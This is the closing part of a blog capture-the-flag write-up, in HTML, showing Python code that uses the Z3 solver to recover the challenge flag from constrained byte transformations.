+        <span class=n>s</span><span class=o>.</span><span class=n>add</span><span class=p>(</span><span class=n>outputs</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>==</span> <span class=nb>ord</span><span class=p>(</span><span class=n>cribbed</span><span class=p>))</span>
+    <span class=k>else</span><span class=p>:</span>
+        <span class=n>s</span><span class=o>.</span><span class=n>add</span><span class=p>(</span><span class=n>outputs</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>==</span> <span class=n>Int2BV</span><span class=p>(</span><span class=n>original</span><span class=p>[</span><span class=n>i</span><span class=p>],</span> <span class=mi>8</span><span class=p>))</span>
+        <span class=n>s</span><span class=o>.</span><span class=n>add</span><span class=p>(</span><span class=n>original</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>&gt;=</span> <span class=mi>33</span><span class=p>)</span>  <span class=c1># Guess alphabet range for flag</span>
+        <span class=n>s</span><span class=o>.</span><span class=n>add</span><span class=p>(</span><span class=n>original</span><span class=p>[</span><span class=n>i</span><span class=p>]</span> <span class=o>&lt;=</span> <span class=mi>126</span><span class=p>)</span>
+
+<span class=k>print</span><span class=p>(</span><span class=s2>&quot;LETS GO&quot;</span><span class=p>)</span>
+<span class=k>print</span><span class=p>(</span><span class=n>s</span><span class=o>.</span><span class=n>check</span><span class=p>())</span>
+<span class=n>model</span> <span class=o>=</span> <span class=n>s</span><span class=o>.</span><span class=n>model</span><span class=p>()</span>
+<span class=k>print</span><span class=p>(</span><span class=n>model</span><span class=p>)</span>
+<span class=k>print</span><span class=p>([</span><span class=nb>hex</span><span class=p>(</span><span class=n>model</span><span class=o>.</span><span class=n>eval</span><span class=p>(</span><span class=n>i</span><span class=p>)</span><span class=o>.</span><span class=n>as_long</span><span class=p>())</span> <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=n>original</span><span class=p>])</span>
+<span class=k>print</span><span class=p>([</span><span class=nb>hex</span><span class=p>(</span><span class=n>model</span><span class=o>.</span><span class=n>eval</span><span class=p>(</span><span class=n>i</span><span class=p>)</span><span class=o>.</span><span class=n>as_long</span><span class=p>())</span> <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=n>shuffled</span><span class=p>])</span>
+<span class=k>print</span><span class=p>([</span><span class=nb>hex</span><span class=p>(</span><span class=n>model</span><span class=o>.</span><span class=n>eval</span><span class=p>(</span><span class=n>i</span><span class=p>)</span><span class=o>.</span><span class=n>as_long</span><span class=p>())</span> <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=n>added</span><span class=p>])</span>
+<span class=k>print</span><span class=p>([</span><span class=nb>hex</span><span class=p>(</span><span class=n>model</span><span class=o>.</span><span class=n>eval</span><span class=p>(</span><span class=n>i</span><span class=p>)</span><span class=o>.</span><span class=n>as_long</span><span class=p>())</span> <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=n>xored</span><span class=p>])</span>
+<span class=k>print</span><span class=p>([</span><span class=nb>hex</span><span class=p>(</span><span class=n>model</span><span class=o>.</span><span class=n>eval</span><span class=p>(</span><span class=n>i</span><span class=p>)</span><span class=o>.</span><span class=n>as_long</span><span class=p>())</span> <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=n>outputs</span><span class=p>])</span>
+<span class=k>print</span><span class=p>(</span><span class=s2>&quot;&quot;</span><span class=o>.</span><span class=n>join</span><span class=p>(</span><span class=nb>chr</span><span class=p>(</span><span class=n>model</span><span class=o>.</span><span class=n>eval</span><span class=p>(</span><span class=n>i</span><span class=p>)</span><span class=o>.</span><span class=n>as_long</span><span class=p>())</span> <span class=k>for</span> <span class=n>i</span> <span class=ow>in</span> <span class=n>outputs</span><span class=p>))</span>
+</pre></div> <p>Which after 1 minute prints out the flag <code>CTF{S1MDf0rM3!}</code>.</p> </div> <div class=tags>Tags: <ul><li><a href=https://ℬ㏒.㎈ℓℯℛ.ⓧⓨℤ/tag/security>security</a></li><li><a href=https://ℬ㏒.㎈ℓℯℛ.ⓧⓨℤ/tag/ctf>ctf</a></li></ul></div> </article> </main> <footer> <br><a href=https://ℬ㏒.㎈ℓℯℛ.ⓧⓨℤ>[blog by caller]</a> Correspondence welcome at ℬ㏒ {@} ㎈ℓℯℛ.ⓧⓨℤ </footer> </body> </html>
